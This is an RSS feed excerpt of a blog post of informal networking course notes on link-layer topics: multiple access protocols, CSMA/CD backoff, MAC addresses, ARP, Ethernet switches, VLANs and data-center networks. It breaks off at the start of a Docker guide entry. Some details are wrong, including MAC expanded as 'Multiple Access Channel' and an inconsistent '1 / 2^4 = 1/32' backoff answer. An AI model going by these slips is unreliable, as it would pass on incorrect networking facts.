&lt;h3 id=&#34;multiple-access-protocol-desirable-characteristics&#34; &gt;Multiple Access Protocol Desirable Characteristics
&lt;span&gt;
    &lt;a href=&#34;#multiple-access-protocol-desirable-characteristics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;For a broadcast channel of rate R bits per second,&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;When only one node has data to send, that node has a throughput of R bps.&lt;/li&gt;
&lt;li&gt;When M nodes have data to send, each of these nodes has a throughput of R/M
bps. This need not necessarily imply that each of the M nodes always has an
instantaneous rate of R/M, but rather that each node should have an average
transmission rate of R/M over some suitably defined interval of time.&lt;/li&gt;
&lt;li&gt;The protocol is decentralized; that is, there is no master node that represents a
single point of failure for the network.&lt;/li&gt;
&lt;li&gt;The protocol is simple, so that it is inexpensive to implement.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;channel-partitioning-protocols-protocols&#34; &gt;Channel Partitioning Protocols Protocols
&lt;span&gt;
    &lt;a href=&#34;#channel-partitioning-protocols-protocols&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;TDMA: Time Division Multiple Access
&lt;ul&gt;
&lt;li&gt;divides time into time frames and further divides each time frame into N time slots&lt;/li&gt;
&lt;li&gt;slot sizes are chosen to fit a single packet&lt;/li&gt;
&lt;li&gt;rounds, fixed length slot per station in each round&lt;/li&gt;
&lt;li&gt;unused slots are idle&lt;/li&gt;
&lt;li&gt;drawback 1: node is limited to R/N even if only broadcaster&lt;/li&gt;
&lt;li&gt;drawback 2: node has to wait for its turn again even if only broadcaster&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FDMA: Frequency Division Multiple Access
&lt;ul&gt;
&lt;li&gt;Frequency bands instead of time slots&lt;/li&gt;
&lt;li&gt;Same drawback of limited speed&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CDMA: Code Division Multiple Access
&lt;ul&gt;
&lt;li&gt;Encode data bits based on unique code for each node which allows receivers to work with collisions&lt;/li&gt;
&lt;li&gt;Anti-jamming&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;random-access-protocols&#34; &gt;Random Access Protocols
&lt;span&gt;
    &lt;a href=&#34;#random-access-protocols&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Allows for full rate of transmission when node&amp;rsquo;s are given access&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Retransmit on collision with independently chosen random delay&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Slotted ALOHA&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fixed size (L bits) frames&lt;/li&gt;
&lt;li&gt;divide time into fixed slots of size L/R seconds (enough time to transmit one frame)&lt;/li&gt;
&lt;li&gt;clocks synced across nodes&lt;/li&gt;
&lt;li&gt;transmit only at start of slots&lt;/li&gt;
&lt;li&gt;since transmission speed is the same, all nodes would detect the collision&lt;/li&gt;
&lt;li&gt;when colliding, retransmit with probability p until success
&lt;ul&gt;
&lt;li&gt;if there was no probability, then collisions would persist&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;max efficiency of 1/e = .37&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Pure ALOHA (original from Abramson 1970)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;no time slots, no clock sync, fully decentralized&lt;/li&gt;
&lt;li&gt;if collision: retransmit with probability p or wait for frame time&lt;/li&gt;
&lt;li&gt;else: wait for frame transmission time before transmitting again&lt;/li&gt;
&lt;li&gt;max efficiency of 1/2e = 18% efficiency (higher collision probability)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSMA (Carrier Sense Multiple Access)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Listen first, don&amp;rsquo;t interrupt
&lt;ul&gt;
&lt;li&gt;idle: transmit entire frame&lt;/li&gt;
&lt;li&gt;busy: defer&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;collision occurs due to propagation delay&lt;/strong&gt; (time for datagram to travel the link)
&lt;ul&gt;
&lt;li&gt;on collision, entire packet &lt;strong&gt;transmission&lt;/strong&gt; time wasted&lt;/li&gt;
&lt;li&gt;p = function of distance + propagation delay&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSMA/CD: with collision detection&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;listen while transmitting, abort on detection&lt;/li&gt;
&lt;li&gt;we want an interval that is short when the number of colliding nodes is small, and long when the number of colliding nodes is large.&lt;/li&gt;
&lt;li&gt;binary (exponential) backoff on aborts
&lt;ul&gt;
&lt;li&gt;wait &lt;code&gt;K \* time to transmit 512 bits&lt;/code&gt;, where K is chosen from 0 to 2^n -1 where n is the number of collisions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;detect fast and abort transmissions to reduce channel wastage&lt;/li&gt;
&lt;li&gt;easy for ethernet, hard for wireless&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Questions&lt;/p&gt;
&lt;p&gt;In CSMA/CD, after the fifth collision of the same frame, what is the probability that a node chooses K = 4? The result K = 4 corresponds to a backoff delay of how many seconds on a 10 Mbps Ethernet?&lt;/p&gt;
&lt;p&gt;Probability = 1 / 2^4 = 1/32. Delay = 4 * (512 / 10_000_000 (M = 1e6) * 1_000_000) microseconds (1e6)&lt;/p&gt;
&lt;h3 id=&#34;taking-turns-protocols&#34; &gt;Taking-Turns Protocols
&lt;span&gt;
    &lt;a href=&#34;#taking-turns-protocols&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;polling protocol
&lt;ul&gt;
&lt;li&gt;master node required, which is a single point of failure&lt;/li&gt;
&lt;li&gt;master node polls each of the nodes in round-robin&lt;/li&gt;
&lt;li&gt;master node can tell if node is done by detecting the lack of a &amp;ldquo;signal&amp;rdquo; on the channel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;token-passing protocol
&lt;ul&gt;
&lt;li&gt;control token passed from one node to the other&lt;/li&gt;
&lt;li&gt;decentralized, but still has a single point of failure&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;switched-local-networks&#34; &gt;Switched Local Networks
&lt;span&gt;
    &lt;a href=&#34;#switched-local-networks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ethernet protocol&lt;/li&gt;
&lt;li&gt;switches don&amp;rsquo;t know shit about the network layer&lt;/li&gt;
&lt;li&gt;switches use the receiver MAC address in the packet header to figure out where to send the frame, otherwise all nodes get it&lt;/li&gt;
&lt;li&gt;if a node wants to broadcast, it will send to MAC address FF-FF-FF-FF-FF-FF (48 1s)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mac-addresses&#34; &gt;MAC Addresses
&lt;span&gt;
    &lt;a href=&#34;#mac-addresses&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;aka: link-layer address; LAN address; physical address&lt;/li&gt;
&lt;li&gt;each frame has a unique MAC (Multiple Access Channel) address for source&lt;/li&gt;
&lt;li&gt;MAC needed to get assigned an IP address by the DHCP server (probably bundled with the router in home networks)&lt;/li&gt;
&lt;li&gt;48-bit MAC address (hardware or random software)&lt;/li&gt;
&lt;li&gt;local unique 32-bit IP address&lt;/li&gt;
&lt;li&gt;IEEE manages the MAC address space so that manufacturers do not conflict&lt;/li&gt;
&lt;li&gt;manufacturers purchase MAC address space&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;arp-in-action&#34; &gt;ARP in Action
&lt;span&gt;
    &lt;a href=&#34;#arp-in-action&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Address Resolution Protocol&lt;/li&gt;
&lt;li&gt;Determining corresponding MAC address of an IP address&lt;/li&gt;
&lt;li&gt;Use if a node doesn&amp;rsquo;t have a MAC address in its &lt;em&gt;ARP table&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Off the subnet:
&lt;ul&gt;
&lt;li&gt;Need to send the frame to the router first via MAC address (datagram still destined to receiver&amp;rsquo;s IP address)&lt;/li&gt;
&lt;li&gt;The router will take care of modifying the MAC destination header via its routing table&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ethernet&#34; &gt;Ethernet
&lt;span&gt;
    &lt;a href=&#34;#ethernet&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;dominant LAN tech&lt;/li&gt;
&lt;li&gt;single chip&lt;/li&gt;
&lt;li&gt;bus: all nodes in same collision domain (interconnected cord)&lt;/li&gt;
&lt;li&gt;switched: active link-layer 2 switch in center&lt;/li&gt;
&lt;li&gt;frame
&lt;ul&gt;
&lt;li&gt;preamble, destination addr, source addr, type, data/payload, CRC&lt;/li&gt;
&lt;li&gt;preamble is used to sync receiver and sender clock rates&lt;/li&gt;
&lt;li&gt;ethernet type: higher layer protocol (e.g. IP, but could be others)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;relies on higher layers to figure out reliability&lt;/li&gt;
&lt;li&gt;no connection&lt;/li&gt;
&lt;li&gt;MAC protocol: unslotted CSMA/CD with binary backoff&lt;/li&gt;
&lt;li&gt;Many standards, different physical layer media (fiber, cable), speeds, but common MAC protocol and frame format&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ethernet-switch&#34; &gt;Ethernet Switch
&lt;span&gt;
    &lt;a href=&#34;#ethernet-switch&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;link-layer switch&lt;/li&gt;
&lt;li&gt;improvement over hubs (which is how ethernet collisions could occur before)&lt;/li&gt;
&lt;li&gt;no collisions, full duplex, limits collision domains to each link
&lt;ul&gt;
&lt;li&gt;cannot send multiple to one without collisions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;store-and-forward Ethernet frames&lt;/li&gt;
&lt;li&gt;examine incoming frame&amp;rsquo;s MAC address, selectively forward frame&lt;/li&gt;
&lt;li&gt;hosts are unaware of switches&lt;/li&gt;
&lt;li&gt;Uses switch table to not require configuration (self-learning)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;switches-vs-routers&#34; &gt;Switches vs Routers
&lt;span&gt;
    &lt;a href=&#34;#switches-vs-routers&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Routers are layer-3 packet switches meaning they route using IP addressees, not MAC address. Routers need to be setup, whereas switches are plug-n-play. Switches are susceptible to broadcast storms or large ARP tables. Routers do not have a spanning tree restriction (switches only have one path, whereas routers enable multiple paths for example North America and Europe).&lt;/p&gt;
&lt;h3 id=&#34;self-learning-switches&#34; &gt;Self Learning Switches
&lt;span&gt;
    &lt;a href=&#34;#self-learning-switches&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;When a frame is received, the switch learns of the MAC and location of the sender&lt;/li&gt;
&lt;li&gt;If the destination MAC address is in the table (indexed), send frame only to that node&lt;/li&gt;
&lt;li&gt;Otherwise, flood all interfaces except for arriving interface&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;interconnecting-switches&#34; &gt;Interconnecting Switches
&lt;span&gt;
    &lt;a href=&#34;#interconnecting-switches&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;still self learning&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;virtual-lans&#34; &gt;Virtual LANs
&lt;span&gt;
    &lt;a href=&#34;#virtual-lans&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Map group of port numbers to a VLAN and avoid cross-contamination&lt;/li&gt;
&lt;li&gt;To get from one VLAN to another use the router that is attached to the device with the switch&lt;/li&gt;
&lt;li&gt;Desires
&lt;ul&gt;
&lt;li&gt;Traffic isolation&lt;/li&gt;
&lt;li&gt;Inefficient uses of switch: suppose 10 groups, either need 10 switches or one switch with 96 ports and lack of traffic isolation&lt;/li&gt;
&lt;li&gt;Managing users: want to allow users to move to another group without having to modify cables&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VLAN trunking: special port on all switches to intersect all VLANs (Ethernet frame 802.1Q to cross the VLAN trunk with VLAN ID tag)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;data-center-networks&#34; &gt;Data Center Networks
&lt;span&gt;
    &lt;a href=&#34;#data-center-networks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;top of rack (TOR) switch is layer-4 because it also makes decision based on the destination port-numbers&lt;/li&gt;
&lt;li&gt;20-40 server blades&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Facebook F16:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;spine switch&lt;/li&gt;
&lt;li&gt;fabric switch&lt;/li&gt;
&lt;li&gt;TOR switch&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Multipath with redundancy&lt;/p&gt;
&lt;h3 id=&#34;datacenter-protocol-innovations&#34; &gt;Datacenter Protocol Innovations
&lt;span&gt;
    &lt;a href=&#34;#datacenter-protocol-innovations&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;RoCE: remote DMA (RDMA) over Converged Etherenet
&lt;ul&gt;
&lt;li&gt;Don&amp;rsquo;t know what this is&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ECN: explicit congestion notification used in transport-layer congestion control (DCTCP, DCQCN)&lt;/li&gt;
&lt;li&gt;experimentation with hop-by-hop (backpressure) congestion control&lt;/li&gt;
&lt;li&gt;SDN used within&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nym-mixnet-sphinx&#34; &gt;Nym Mixnet Sphinx
&lt;span&gt;
    &lt;a href=&#34;#nym-mixnet-sphinx&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Abdullah and Hossein project&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/nymtech&#34;&gt;Nym GitHub&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/nymtech/sphinx&#34;&gt;Sphinx Rust implementation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;questions&#34; &gt;Questions
&lt;span&gt;
    &lt;a href=&#34;#questions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;What is QoS (quality of service)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;other&#34; &gt;Other
&lt;span&gt;
    &lt;a href=&#34;#other&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc1918&#34;&gt;RC 1918&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Private network addresses: 10/8, 172.16/12, and 192.168/16.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Docker Guide</title>
      <link>https://blog.elijahlopez.ca/posts/docker-guide/</link>
      <pubDate>Mon, 15 Apr 2024 13:27:34 -0400</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/docker-guide/</guid>
      <description>&lt;div&gt;
    &lt;h2&gt;Table of Contents&lt;/h2&gt;
    &lt;nav id=&#34;TableOfContents&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&#34;#quick-reference&#34;&gt;Quick Reference&lt;/a&gt;
      &lt;ul&gt;
